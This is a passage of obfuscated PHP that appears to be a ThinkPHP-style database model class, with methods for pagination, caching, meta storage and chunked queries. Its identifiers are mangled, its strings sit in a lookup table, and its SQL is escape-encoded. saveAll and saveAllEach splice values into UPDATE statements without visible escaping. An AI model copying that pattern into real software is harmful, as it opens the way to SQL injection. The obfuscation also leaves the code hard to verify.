(!$this->checkDataAutoHas($_SERVER[™¾ÇÙ¯¹][366])) { return; } $this->dataAfterFilter($Ñ…ßÂÌ); } public static function textEncode($Íšî÷ ) { if (!$Íšî÷ ) { return $Íšî÷ ; } $ü¼†úı  = json_encode($Íšî÷ ); $ü¼†úı  = preg_replace_callback($_SERVER[™¾ÇÙ¯¹][367], function ($ü©ŸöÍÉ) { return addslashes($ü©ŸöÍÉ[0]); }, $ü¼†úı ); return json_decode($ü¼†úı ); } public static function textDecode($Ê¼ì†õ) { $Õ›¥Óù =& $_SERVER[™¾ÇÙ¯¹]; $†Ö€åŸ = json_encode($Ê¼ì†õ); $†Ö€åŸ = preg_replace_callback($Õ›¥Óù[368], function ($Ç­ÊÆıÔ) { return $_SERVER[™¾ÇÙ¯¹][97]; }, $†Ö€åŸ); return json_decode($†Ö€åŸ); } public function setAutoIncrement($Ç­óøê) { $æ›ğ£½¸ = array($this->getPk() => $Ç­óøê); $êŠ•Ÿ®‚ = $this->data($æ›ğ£½¸)->add(); if ($êŠ•Ÿ®‚) { $this->delete($êŠ•Ÿ®‚); } } public function getAutoIncrement() { $´Îü”½‰ = $this->getTableName(); $¨ôùİş° = $this->max($this->getPk()); $ö»Î©ä = $this->query("\163\x68\157\x77\40\164\141\142\154\x65\40\x73\x74\141\x74\x75\163\x20\167\x68\145\x72\145\x20\116\x61\155\x65\x3d\47{$´Îü”½‰}\47"); $…÷ÅÉï = $ö»Î©ä[0][$_SERVER[™¾ÇÙ¯¹][369]]; $±¶Šİ—¶ = max($¨ôùİş°, $…÷ÅÉï); return $±¶Šİ—¶; } protected function _callBefore($¦®¼–ĞĞ, $¬Ø¦é) { return $this->cacheCallCheck($¦®¼–ĞĞ, $¬Ø¦é, !1); } protected function _callAfter($Ù«Áˆ¦, $şô¿úøŞ) { return $this->cacheCallCheck($Ù«Áˆ¦, $şô¿úøŞ, !0); } protected function cacheFunctionAlias($×İÀÅ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‡ñÀÜÉ´, $»·ËÛ, $®ª¯ßŸÜ = false) { $óù­ƒ = $this->cacheFunctionAlias($»·ËÛ); if (!$óù­ƒ) { return; } foreach ($óù­ƒ as $€¼ü¼ => $ç‹ÄŒÉí) { $ß­›» = $ç‹ÄŒÉí[0]; $¾æŸ“„ú = explode($_SERVER[™¾ÇÙ¯¹][50], $ç‹ÄŒÉí[1]); if ($‡ñÀÜÉ´ == $€¼ü¼) { return $this->cacheFunctionGet($€¼ü¼, $ß­›»); } if ($®ª¯ßŸÜ && in_array($‡ñÀÜÉ´, $¾æŸ“„ú)) { $this->cacheFunctionClear($€¼ü¼, $ß­›»); } } } public function cacheFunctionGet($‘ôùªºğ, $‚º¤·à) { $ïùËæÎŸ = $this->cacheKeyMake($‘ôùªºğ, $‚º¤·à); $áÏæƒ™» = Cache::get($ïùËæÎŸ); if (!is_array($áÏæƒ™»)) { $áÏæƒ™» = call_user_func_array(array($this, $‘ôùªºğ), array($‚º¤·à, !0)); Cache::set($ïùËæÎŸ, $áÏæƒ™»); } return $áÏæƒ™»; } public function cacheFunctionClear($´¶øø‚Æ, $ò‚•ø•Ù) { $Ò®Ä«±ë = $ò‚•ø•Ù; if (!is_array($ò‚•ø•Ù)) { $Ò®Ä«±ë = array($ò‚•ø•Ù); } foreach ($Ò®Ä«±ë as $Ôú„ŠÑ) { $•çÒŠø = $this->cacheKeyMake($´¶øø‚Æ, $Ôú„ŠÑ); Cache::remove($•çÒŠø); } } private function cacheKeyMake($î‡¸¡šÇ, $•’åö´) { $—ñ™ÑŠŸ =& $_SERVER[™¾ÇÙ¯¹]; return get_class($this) . $—ñ™ÑŠŸ[11] . $î‡¸¡šÇ . $—ñ™ÑŠŸ[370] . $•’åö´; } protected function selectPageReset() { $á‚«í¬ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($GLOBALS[$á‚«í¬[371]])) { return; } $GLOBALS[$á‚«í¬[371]] = isset($GLOBALS[$á‚«í¬[7]][$á‚«í¬[372]]) ? $GLOBALS[$á‚«í¬[7]][$á‚«í¬[372]] : !1; $GLOBALS[$á‚«í¬[373]] = isset($GLOBALS[$á‚«í¬[7]][$á‚«í¬[362]]) ? $GLOBALS[$á‚«í¬[7]][$á‚«í¬[362]] : !1; $GLOBALS[$á‚«í¬[7]][$á‚«í¬[372]] = !1; $GLOBALS[$á‚«í¬[7]][$á‚«í¬[362]] = !1; } protected function selectPageRestore() { $Ä§ÒÈ› =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($GLOBALS[$Ä§ÒÈ›[371]])) { return; } $GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[372]] = $GLOBALS[$Ä§ÒÈ›[371]]; $GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[362]] = $GLOBALS[$Ä§ÒÈ›[373]]; if ($GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[372]] === !1) { unset($GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[372]]); } if ($GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[362]] === !1) { unset($GLOBALS[$Ä§ÒÈ›[7]][$Ä§ÒÈ›[362]]); } unset($GLOBALS[$Ä§ÒÈ›[371]]); unset($GLOBALS[$Ä§ÒÈ›[373]]); } protected function selectPage($áö´‰¥ı = 200, $ËÊóöìó = 1) { $æÒ™ŞÎ =& $_SERVER[™¾ÇÙ¯¹]; global $in; $¯ÕÏª÷û = $this->optionsValue(); $¤Ôæî×Í = 50000; $áö´‰¥ı = isset($in[$æÒ™ŞÎ[372]]) && $in[$æÒ™ŞÎ[372]] ? $in[$æÒ™ŞÎ[372]] : $áö´‰¥ı; if ($áö´‰¥ı === -1) { $in[$æÒ™ŞÎ[372]] = !1; $¤Ôæî×Í = 100000000; $áö´‰¥ı = $¤Ôæî×Í; } $šÂ¼Ç£å = $¯ÕÏª÷û; $šÂ¼Ç£å[$æÒ™ŞÎ[374]] = array(); $áö´‰¥ı = intval($áö´‰¥ı); $áö´‰¥ı = $áö´‰¥ı <= 5 ? 5 : ($áö´‰¥ı >= $¤Ôæî×Í ? $¤Ôæî×Í : $áö´‰¥ı); $ËÊóöìó = intval(isset($in[$æÒ™ŞÎ[362]]) && $in[$æÒ™ŞÎ[362]] ? $in[$æÒ™ŞÎ[362]] : $ËÊóöìó); $ËÊóöìó = $ËÊóöìó <= 1 ? 1 : $ËÊóöìó; $¡ÇÜ®ş  = array(); $Ì•Üİø¶ = 1; if ($ËÊóöìó == 1 && $Ì•Üİø¶) { $this->optionsValue($¯ÕÏª÷û); $¡ÇÜ®ş  = $this->page($ËÊóöìó, $áö´‰¥ı)->select(); $Ù¶µúøï = is_array($¡ÇÜ®ş ) ? count($¡ÇÜ®ş ) : 0; if ($Ù¶µúøï < $áö´‰¥ı) { $ºÕÛš‰” = 1; } else { $this->optionsValue($šÂ¼Ç£å); $Ù¶µúøï = intval($this->count()); $ºÕÛš‰” = ceil($Ù¶µúøï / $áö´‰¥ı); } } else { $this->optionsValue($šÂ¼Ç£å); $Ù¶µúøï = intval($this->count()); $ºÕÛš‰” = ceil($Ù¶µúøï / $áö´‰¥ı); $ËÊóöìó = $ËÊóöìó >= $ºÕÛš‰” ? $ºÕÛš‰” : $ËÊóöìó; $this->optionsValue($¯ÕÏª÷û); $¡ÇÜ®ş  = $this->page($ËÊóöìó, $áö´‰¥ı)->select(); } if (!is_array($¡ÇÜ®ş )) { $¡ÇÜ®ş  = array(); } if ($ºÕÛš‰” == 1) { $Ù¶µúøï = count($¡ÇÜ®ş ); } $¸«öëŒ» = array($æÒ™ŞÎ[375] => array($æÒ™ŞÎ[376] => $Ù¶µúøï, $æÒ™ŞÎ[372] => $áö´‰¥ı, $æÒ™ŞÎ[362] => $ËÊóöìó, $æÒ™ŞÎ[377] => $ºÕÛš‰”), $æÒ™ŞÎ[378] => $¡ÇÜ®ş ); return $¸«öëŒ»; } protected function checkLength($ëĞƒî, $Äô£‚™ = 0, $×â»Å•® = '') { $Íü®Êà« =& $_SERVER[™¾ÇÙ¯¹]; $Äô£‚™ = $Äô£‚™ ? $Äô£‚™ : 65536; if (!$ëĞƒî || strlen($ëĞƒî) < $Äô£‚™) { return; } $×â»Å•® = $×â»Å•® ? $×â»Å•® . $Íü®Êà«[71] : $Íü®Êà«[12]; show_json($×â»Å•® . LNG($Íü®Êà«[379]) . "\50{$Äô£‚™}\51", !1); } protected function metaSet($Áù‰®Šƒ, $¼ø¶û™¥ = null, $ğ³³Ó˜® = null) { $¢÷ÀúÆ… =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->tableMeta || !$Áù‰®Šƒ) { return !1; } $Úş¤–„ = $this->tableMeta[$¢÷ÀúÆ…[380]]; $‘úığÔê = $this->tableMeta[$¢÷ÀúÆ…[381]]; $µ Œí = Model($‘úığÔê); $‹†óôÎ“ = array($Úş¤–„ => $Áù‰®Šƒ, $¢÷ÀúÆ…[382] => $¼ø¶û™¥); if (is_null($¼ø¶û™¥)) { return $µ Œí->where(array($Úş¤–„ => $Áù‰®Šƒ))->delete(); } if (is_null($ğ³³Ó˜®) && is_string($¼ø¶û™¥)) { return $µ Œí->where($‹†óôÎ“)->delete(); } $ë­ÛŸ‘Ş = is_array($¼ø¶û™¥) ? $¼ø¶û™¥ : array(); if (is_string($¼ø¶û™¥)) { $ë­ÛŸ‘Ş[$¼ø¶û™¥] = $ğ³³Ó˜®; } $Å¥‹¼¹£ = array(); foreach ($ë­ÛŸ‘Ş as $«ùÒƒ¢Ø => $–×Ú¹Ã) { if (is_null($–×Ú¹Ã) && is_string($«ùÒƒ¢Ø)) { $µ Œí->where(array($Úş¤–„ => $Áù‰®Šƒ, $¢÷ÀúÆ…[382] => $«ùÒƒ¢Ø))->delete(); continue; } $this->checkLength($–×Ú¹Ã, !1, $‘úığÔê . $¢÷ÀúÆ…[4] . $«ùÒƒ¢Ø); $Å¥‹¼¹£[] = array($Úş¤–„ => $Áù‰®Šƒ, $¢÷ÀúÆ…[94] => $«ùÒƒ¢Ø, $¢÷ÀúÆ…[383] => $–×Ú¹Ã); } $êÊÊ“Ü’ = $¢÷ÀúÆ…[384] . $‘úığÔê; CacheLock::lock($êÊÊ“Ü’); $µ Œí->where(array($Úş¤–„ => $Áù‰®Šƒ))->addAll($Å¥‹¼¹£, array(), !0); CacheLock::unlock($êÊÊ“Ü’); return !0; } public function metaGet($åº„ø«à, $ó²ğˆ©ú = false) { $¢Ñ¡Òõ§ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->tableMeta) { return array(); } $¡¬«çŠª = $this->tableMeta[$¢Ñ¡Òõ§[380]]; $ÊšéÌ© = Model($this->tableMeta[$¢Ñ¡Òõ§[381]]); if ($ó²ğˆ©ú) { $±ãàêıÀ = array($¡¬«çŠª => $åº„ø«à, $¢Ñ¡Òõ§[94] => $ó²ğˆ©ú); return $ÊšéÌ©->where($±ãàêıÀ)->getField($¢Ñ¡Òõ§[383]); } $±ãàêıÀ = array($¡¬«çŠª => $åº„ø«à); $©ßÛÔÕš = $ÊšéÌ©->field($¢Ñ¡Òõ§[385])->where($±ãàêıÀ)->select(); $©ßÛÔÕš = array_to_keyvalue($©ßÛÔÕš, $¢Ñ¡Òõ§[94], $¢Ñ¡Òõ§[383]); return $©ßÛÔÕš; } private function checkDataAutoHas($Ğ•ÙÙî) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $×õàÉÑØ) { if (in_array($Ğ•ÙÙî, explode($_SERVER[™¾ÇÙ¯¹][50], $×õàÉÑØ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‡É£æÂ£, $íİ™ó¥†) { $øªª‚ûó =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($‡É£æÂ£)) { return; } foreach ($this->dataAuto as $Ô§ˆ¼ôï) { $³åÃïŒ” = $Ô§ˆ¼ôï[0]; if (!in_array($íİ™ó¥†, explode($øªª‚ûó[50], $Ô§ˆ¼ôï[2]))) { continue; } switch (trim($Ô§ˆ¼ôï[3])) { case $øªª‚ûó[330]: case $øªª‚ûó[331]: $‡¾áèŠ = $Ô§ˆ¼ôï[1]; $£öÜƒÆ = isset($Ô§ˆ¼ôï[4]) ? (array) $Ô§ˆ¼ôï[4] : array(); if ($‡¾áèŠ == $øªª‚ûó[203] && array_key_exists($³åÃïŒ”, $‡É£æÂ£)) { if (!$‡É£æÂ£[$³åÃïŒ”]) { unset($‡É£æÂ£[$³åÃïŒ”]); } break; } if (isset($‡É£æÂ£[$³åÃïŒ”])) { array_unshift($£öÜƒÆ, $‡É£æÂ£[$³åÃïŒ”]); } if ($øªª‚ûó[330] == $Ô§ˆ¼ôï[3]) { $‡É£æÂ£[$³åÃïŒ”] = call_user_func_array($‡¾áèŠ, $£öÜƒÆ); } else { $‡É£æÂ£[$³åÃïŒ”] = call_user_func_array(array(&$this, $‡¾áèŠ), $£öÜƒÆ); } break; case $øªª‚ûó[279]: if (isset($‡É£æÂ£[$³åÃïŒ”]) && $‡É£æÂ£[$³åÃïŒ”]) { $‡É£æÂ£[$³åÃïŒ”] = call_user_func_array(array(&$this, $Ô§ˆ¼ôï[1]), array($‡É£æÂ£[$³åÃïŒ”])); } break; case $øªª‚ûó[282]: $‡É£æÂ£[$³åÃïŒ”] = $‡É£æÂ£[$Ô§ˆ¼ôï[1]]; break; case $øªª‚ûó[303]: if (isset($‡É£æÂ£[$³åÃïŒ”]) && !is_string($‡É£æÂ£[$³åÃïŒ”])) { $‡É£æÂ£[$³åÃïŒ”] = json_encode_force($‡É£æÂ£[$³åÃïŒ”]); } break; case $øªª‚ûó[332]: if ($‡É£æÂ£[$³åÃïŒ”] === $øªª‚ûó[12]) { unset($‡É£æÂ£[$³åÃïŒ”]); } break; case $øªª‚ûó[333]: $‡É£æÂ£[$³åÃïŒ”] = $Ô§ˆ¼ôï[1]; default: break; } } if ($íİ™ó¥† == $øªª‚ûó[364]) { $‚ä²”ë = strtolower($this->db->getDbType()); if (strpos($‚ä²”ë, $øªª‚ûó[13]) !== 0) { return; } $¼ª‡Ø† = $this->field(!0)->fields; $Úõ­Ø°ñ = $¼ª‡Ø†[$øªª‚ûó[261]]; if (isset($¼ª‡Ø†[$øªª‚ûó[260]])) { unset($Úõ­Ø°ñ[$¼ª‡Ø†[$øªª‚ûó[260]]]); } foreach ($Úõ­Ø°ñ as $•§¾Œ½Ö => $íİ™ó¥†) { if (!isset($‡É£æÂ£[$•§¾Œ½Ö])) { $‡É£æÂ£[$•§¾Œ½Ö] = $øªª‚ûó[12]; } } } } private function dataAfterFilter(&$Îø÷µŞª) { $óĞ¼¼·Ñ =& $_SERVER[™¾ÇÙ¯¹]; foreach ($this->dataAuto as $Åö«ßøÏ) { $’É”ï—ß = $Åö«ßøÏ[0]; if (!isset($Îø÷µŞª[$’É”ï—ß])) { continue; } if (!in_array($óĞ¼¼·Ñ[366], explode($óĞ¼¼·Ñ[50], $Åö«ßøÏ[2]))) { continue; } switch (trim($Åö«ßøÏ[3])) { case $óĞ¼¼·Ñ[330]: case $óĞ¼¼·Ñ[331]: $‚Ñæ¡è = isset($Åö«ßøÏ[4]) ? (array) $Åö«ßøÏ[4] : array(); array_unshift($‚Ñæ¡è, $Îø÷µŞª[$’É”ï—ß]); if (isset($Åö«ßøÏ[4]) && $Åö«ßøÏ[4] == $óĞ¼¼·Ñ[386]) { $‚Ñæ¡è = array($Îø÷µŞª[$’É”ï—ß]); } if ($óĞ¼¼·Ñ[330] == $Åö«ßøÏ[3]) { $Îø÷µŞª[$’É”ï—ß] = call_user_func_array($Åö«ßøÏ[1], $‚Ñæ¡è); } else { $Îø÷µŞª[$’É”ï—ß] = call_user_func_array(array(&$this, $Åö«ßøÏ[1]), $‚Ñæ¡è); } break; case $óĞ¼¼·Ñ[279]: if (isset($Îø÷µŞª[$’É”ï—ß]) && $Îø÷µŞª[$’É”ï—ß]) { $Îø÷µŞª[$’É”ï—ß] = call_user_func_array(array(&$this, $Åö«ßøÏ[1]), array($Îø÷µŞª[$’É”ï—ß])); } break; case $óĞ¼¼·Ñ[282]: $Îø÷µŞª[$’É”ï—ß] = $Îø÷µŞª[$Åö«ßøÏ[1]]; break; case $óĞ¼¼·Ñ[303]: $‚°ŠğÙ = $Îø÷µŞª[$’É”ï—ß]; $Îø÷µŞª[$’É”ï—ß] = json_decode($‚°ŠğÙ, !0); if (is_null($Îø÷µŞª[$’É”ï—ß])) { $Îø÷µŞª[$’É”ï—ß] = $‚°ŠğÙ; } break; case $óĞ¼¼·Ñ[332]: if ($Îø÷µŞª[$’É”ï—ß] === $óĞ¼¼·Ñ[12]) { unset($Îø÷µŞª[$’É”ï—ß]); } break; case $óĞ¼¼·Ñ[333]: $Îø÷µŞª[$’É”ï—ß] = $Åö«ßøÏ[1]; break; default: break; } } } public function saveAll($†ƒÄƒœÏ) { $”şÂĞéí =& $_SERVER[™¾ÇÙ¯¹]; $õÑİí§ = $this->tablePrefix . $this->tableName; $çù°ò¾à = self::SQL_WHERE_IN_CHUNK; $†ƒÄƒœÏ = is_array($†ƒÄƒœÏ) ? $†ƒÄƒœÏ : array(); $ˆÎú†é = $”şÂĞéí[252]; $„»ö”ó = 0; $³ŠŠâç = array(); $Íª¤½– = count($†ƒÄƒœÏ); for ($¨øú¡Ç¯ = 0; $¨øú¡Ç¯ < $Íª¤½–; $¨øú¡Ç¯++) { $¸º¸ÆÎ— = $†ƒÄƒœÏ[$¨øú¡Ç¯]; if (!is_array($¸º¸ÆÎ—) || count($¸º¸ÆÎ—) != 4) { continue; } $–ÄÕÓ‡Í = "\x55\x50\104\101\124\105\x20\140{$õÑİí§}\x60\x20\x53\105\124\x20{$¸º¸ÆÎ—[2]}\40\x3d\40\x43\101\123\105\40{$¸º¸ÆÎ—[0]}\40\xa"; if ($„»ö”ó == 0) { $ˆÎú†é = $–ÄÕÓ‡Í; } $³ŠŠâç[] = $”şÂĞéí[118] . $¸º¸ÆÎ—[1] . $”şÂĞéí[118]; $„»ö”ó++; $ˆÎú†é .= "\40\127\x48\105\x4e\x20\x27{$¸º¸ÆÎ—[1]}\47\40\x54\x48\105\x4e\40\47{$¸º¸ÆÎ—[3]}\47\40\12"; if ($„»ö”ó == $çù°ò¾à || $¨øú¡Ç¯ == $Íª¤½– - 1) { $ğğ„·—Ÿ = implode($”şÂĞéí[50], $³ŠŠâç); $ˆÎú†é .= "\x20\105\x4e\x44\x20\x20\127\x48\105\122\x45\40{$¸º¸ÆÎ—[0]}\40\x49\116\x20\50{$ğğ„·—Ÿ}\x29\40"; $this->execute($ˆÎú†é); $„»ö”ó = 0; $ˆÎú†é = $–ÄÕÓ‡Í; $this->chunkEventCheck(count($³ŠŠâç)); $³ŠŠâç = array(); } } $this->chunkEventSet(); } public function saveAllEach($ƒŠ¿¨®ß) { $Ò¶ı—­¡ =& $_SERVER[™¾ÇÙ¯¹]; $É•Üİß• = $this->tablePrefix . $this->tableName; foreach ($ƒŠ¿¨®ß as $Â“ú¹¿˜) { if (!is_array($Â“ú¹¿˜) || count($Â“ú¹¿˜) != 4) { continue; } $´‡…¿™˜ = $Â“ú¹¿˜[0] . $Ò¶ı—­¡[387] . $Â“ú¹¿˜[1] . $Ò¶ı—­¡[118]; $û›íà¿Ì = $Â“ú¹¿˜[2] . $Ò¶ı—­¡[387] . $Â“ú¹¿˜[3] . $Ò¶ı—­¡[118]; $ÚÃ—Â…Ä = "\165\x70\x64\141\x74\x65\x20{$É•Üİß•}\x20\163\x65\x74\x20{$û›íà¿Ì}\x20\x77\x68\x65\x72\x65\x20{$´‡…¿™˜}\x3b"; $this->execute($ÚÃ—Â…Ä); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¥®Àßèø = false, $òÌƒ“œ = false) { $this->_chunkEvent = $¥®Àßèø; $this->_chunkEventParam = $òÌƒ“œ; } private function chunkEventCheck($¶İÇùå›) { if (!$this->_chunkEvent) { return; } $§å·Õç› = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $§å·Õç›[$_SERVER[™¾ÇÙ¯¹][388]] = $¶İÇùå›; Hook::trigger($this->_chunkEvent, $§å·Õç›); } public function addAll($ŞÏğ—óë, $¸ÔÁÜÑ’ = array(), $¡ÌÛöÉ  = false) { $Â¦‘Ç =& $_SERVER[™¾ÇÙ¯¹]; ignore_timeout(); $°òû÷ìİ = self::SQL_WHERE_IN_CHUNK; if (empty($ŞÏğ—óë)) { $this->error = think_lang($Â¦‘Ç[280]); return !1; } $¸ÔÁÜÑ’ = $this->_parseOptions($¸ÔÁÜÑ’); foreach ($ŞÏğ—óë as $—ÊŠÊå‰ => $´”¹°Óì) { $ŞÏğ—óë[$—ÊŠÊå‰] = $this->_facade($´”¹°Óì); $this->_beforeInsert($ŞÏğ—óë[$—ÊŠÊå‰], $¸ÔÁÜÑ’); } if (method_exists($this->db, $Â¦‘Ç[281])) { for ($ª¸±’Ş = 0; $ª¸±’Ş < count($ŞÏğ—óë); $ª¸±’Ş += $°òû÷ìİ) { $Ï¢Íº¸‡ = array_slice($ŞÏğ—óë, $ª¸±’Ş, $°òû÷ìİ); if (!is_array($Ï¢Íº¸‡) || count($Ï¢Íº¸‡) == 0) { break; } $³Û±òˆ  = $this->db->insertAll($Ï¢Íº¸‡, $¸ÔÁÜÑ’, $¡ÌÛöÉ ); $this->chunkEventCheck(count($Ï¢Íº¸‡)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ŞÏğ—óë as $—ÊŠÊå‰ => $´”¹°Óì) { $³Û±òˆ  = $this->db->insert($´”¹°Óì, $¸ÔÁÜÑ’, $¡ÌÛöÉ ); } $this->commit(); } if (!1 !== $³Û±òˆ ) { $Æ‚üÑ°î = $this->getLastInsID(); if ($Æ‚üÑ°î) { return $Æ‚üÑ°î; } } return $³Û±òˆ ; } public function save($µî…ùıÕ = '', $•Şê¦‘õ = array()) { $¸ò™Çø =& $_SERVER[™¾ÇÙ¯¹]; $Ùğ„ï‡Ò = self::SQL_WHERE_IN_CHUNK; $øÚİƒ†ê = $this->optionsValue(); $Ğæ“  = $this->findWhereField($øÚİƒ†ê); if (!$Ğæ“ ) { return parent::save($µî…ùıÕ, $•Şê¦‘õ); } $§¡ä¿¨È = 0; $›¬ª§·¬ = $øÚİƒ†ê[$¸ò™Çø[284]][$Ğæ“ ][1]; $›¬ª§·¬ = is_array($›¬ª§·¬) ? $›¬ª§·¬ : array(); $¹°­Ä—Á = count($›¬ª§·¬); for ($ú¸¹®Ÿù = 0; $ú¸¹®Ÿù < $¹°­Ä—Á; $ú¸¹®Ÿù += $Ùğ„ï‡Ò) { $óÔ‚é®ì = array_slice($›¬ª§·¬, $ú¸¹®Ÿù, $Ùğ„ï‡Ò); if (!is_array($óÔ‚é®ì) || count($óÔ‚é®ì) == 0) { break; } $øÚİƒ†ê[$¸ò™Çø[284]][$Ğæ“ ][1] = $óÔ‚é®ì; $this->optionsValue($øÚİƒ†ê); $§¡ä¿¨È += parent::save($µî…ùıÕ, $•Şê¦‘õ); $this->chunkEventCheck(count($óÔ‚é®ì)); } $this->chunkEventSet(); return $§¡ä¿¨È; } public function add($Ìéï—È = '', $ö¥ÑëÏÖ = array(), $ûŠâÓ¾Ú = false) { if ($this->addTaskStatus && is_array($Ìéï—È)) { $this->addTaskData[] = $Ìéï—È; return; } return parent::add($Ìéï—È, $ö¥ÑëÏÖ, $ûŠâÓ¾Ú); } public function parseWhereLike($Ğ™¡ß¸¦, $êì“ËµŞ = '', $«©û›•é = false, &$•œ«ìö‘ = false) { $·‘÷¦â =& $_SERVER[™¾ÇÙ¯¹]; $Ú‡úÃ‡ú = $GLOBALS[$·‘÷¦â[6]][$·‘÷¦â[389]]; if (!$Ú‡úÃ‡ú[$·‘÷¦â[390]]) { return $Ğ™¡ß¸¦; } if (!is_array($Ğ™¡ß¸¦)) { return $Ğ™¡ß¸¦; } $ìÃ…ù¦á = array(); $×ÇÙ«Í¬ = 0; foreach ($Ğ™¡ß¸¦ as $¹¹µÁä => $—‹¾¿´³) { if (is_array($—‹¾¿´³) && count($—‹¾¿´³) == 2 && $—‹¾¿´³[0] == $·‘÷¦â[391] && is_string($—‹¾¿´³[1]) && substr($—‹¾¿´³[1], 0, 1) == $·‘÷¦â[392] && substr($—‹¾¿´³[1], strlen($—‹¾¿´³[1]) - 1, 1) == $·‘÷¦â[392]) { $•œ«ìö‘ = !0; $×¨·şÊƒ = is_string($¹¹µÁä) ? $¹¹µÁä : $êì“ËµŞ; $Û±¸Ï–¿ = substr($—‹¾¿´³[1], 1, strlen($—‹¾¿´³[1]) - 2); $Û±¸Ï–¿ = $this->db->escapeString($Û±¸Ï–¿); if (!strpos($×¨·şÊƒ, $·‘÷¦â[10])) { $×¨·şÊƒ = $·‘÷¦â[393] . $×¨·şÊƒ . $·‘÷¦â[393]; } $³Æ…“Ûß = $·‘÷¦â[188] . $Û±¸Ï–¿ . $·‘÷¦â[188]; $Û±¸Ï–¿ = str_replace(array($·‘÷¦â[10], $·‘÷¦â[394], $·‘÷¦â[11]), $·‘÷¦â[395], $Û±¸Ï–¿); if ($Ú‡úÃ‡ú[$·‘÷¦â[396]]) { $³Æ…“Ûß = $·‘÷¦â[397] . $Û±¸Ï–¿ . $·‘÷¦â[398]; if ($Ú‡úÃ‡ú[$·‘÷¦â[399]]) { $³Æ…“Ûß = $·‘÷¦â[398] . $Û±¸Ï–¿ . $·‘÷¦â[397]; } } $ìÃ…ù¦á[$×ÇÙ«Í¬] = $·‘÷¦â[400] . $×¨·şÊƒ . $·‘÷¦â[401] . $³Æ…“Ûß . $·‘÷¦â[402]; $×ÇÙ«Í¬++; continue; } if (is_array($—‹¾¿´³)) { $êì“ËµŞ = is_string($¹¹µÁä) ? $¹¹µÁä : $êì“ËµŞ; $—‹¾¿´³ = $this->parseWhereLike($—‹¾¿´³, $êì“ËµŞ, !0, $•œ«ìö‘); } if (is_numeric($¹¹µÁä)) { $ìÃ…ù¦á[$×ÇÙ«Í¬] = $—‹¾¿´³; $×ÇÙ«Í¬++; } else { $ìÃ…ù¦á[$¹¹µÁä] = $—‹¾¿´³; } } if ($•œ«ìö‘ && !$«©û›•é) { } return $ìÃ…ù¦á; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Æ¥şÍæ· = array()) { $Í²øÛß° =& $_SERVER[™¾ÇÙ¯¹]; $ˆß¥ö = self::SQL_WHERE_IN_CHUNK; $­õûô·ã = $this->optionsValue(); $Ëâ¡Â = $this->findWhereField($­õûô·ã); if (!$Ëâ¡Â || isset($­õûô·ã[$Í²øÛß°[301]]) || isset($­õûô·ã[$Í²øÛß°[362]])) { return parent::select($Æ¥şÍæ·); } $£ˆ†ü‚ = $­õûô·ã[$Í²øÛß°[284]][$Ëâ¡Â][1]; $£ˆ†ü‚ = is_array($£ˆ†ü‚) ? $£ˆ†ü‚ : array(); $í—«¿ÊÉ = null; for ($‚¼ûº½‚ = 0; $‚¼ûº½‚ < count($£ˆ†ü‚); $‚¼ûº½‚ += $ˆß¥ö) { $ÄÍòßˆğ = array_slice($£ˆ†ü‚, $‚¼ûº½‚, $ˆß¥ö); if (!is_array($ÄÍòßˆğ) || count($ÄÍòßˆğ) == 0) { break; } $­õûô·ã[$Í²øÛß°[284]][$Ëâ¡Â][1] = $ÄÍòßˆğ; $this->optionsValue($­õûô·ã); $°ÙËÀ¹® = parent::select($Æ¥şÍæ·); if (!$°ÙËÀ¹®) { continue; } $í—«¿ÊÉ = is_array($í—«¿ÊÉ) ? $í—«¿ÊÉ : array(); $í—«¿ÊÉ = array_merge($í—«¿ÊÉ, $°ÙËÀ¹®); } return $í—«¿ÊÉ; } public function delete($µ«–á€ = array()) { $×¹ÍÅíˆ =& $_SERVER[™¾ÇÙ¯¹]; $¹‘¹ìß— = self::SQL_WHERE_IN_CHUNK; $¿¨œƒë… = $this->optionsValue(); $Ù‡Ççã¬ = $this->findWhereField($¿¨œƒë…); if (!$Ù‡Ççã¬) { return parent::delete($µ«–á€); } $ğÌ·‰Ù» = 0; $ªúˆ“’Ô = $¿¨œƒë…[$×¹ÍÅíˆ[284]][$Ù‡Ççã¬][1]; $ªúˆ“’Ô = is_array($ªúˆ“’Ô) ? $ªúˆ“’Ô : array(); for ($ı»Œ¹Éã = 0; $ı»Œ¹Éã < count($ªúˆ“’Ô); $ı»Œ¹Éã += $¹‘¹ìß—) { $æş Œ = array_slice($ªúˆ“’Ô, $ı»Œ¹Éã, $¹‘¹ìß—); if (!is_array($æş Œ) || count($æş Œ) == 0) { break; } $¿¨œƒë…[$×¹ÍÅíˆ[284]][$Ù‡Ççã¬][1] = $æş Œ; $this->optionsValue($¿¨œƒë…); $ğÌ·‰Ù» += parent::delete($µ«–á€); } return $ğÌ·‰Ù»; } private function findWhereField($á”½Äƒ•) { $«ü¤Ê´Ÿ =& $_SERVER[™¾ÇÙ¯¹]; $´âÇ¿ò› = self::SQL_WHERE_IN_CHUNK; if (!is_array($á”½Äƒ•) || !is_array($á”½Äƒ•[$«ü¤Ê´Ÿ[284]])) { return !1; } foreach ($á”½Äƒ•[$«ü¤Ê´Ÿ[284]] as $ƒÑÀ¾µ“ => $ñ©’©´ì) { if (is_array($ñ©’©´ì) && isset($ñ©’©´ì[0]) && is_string($ñ©’©´ì[0]) && strtolower($ñ©’©´ì[0]) == $«ü¤Ê´Ÿ[7] && is_array($ñ©’©´ì[1]) && 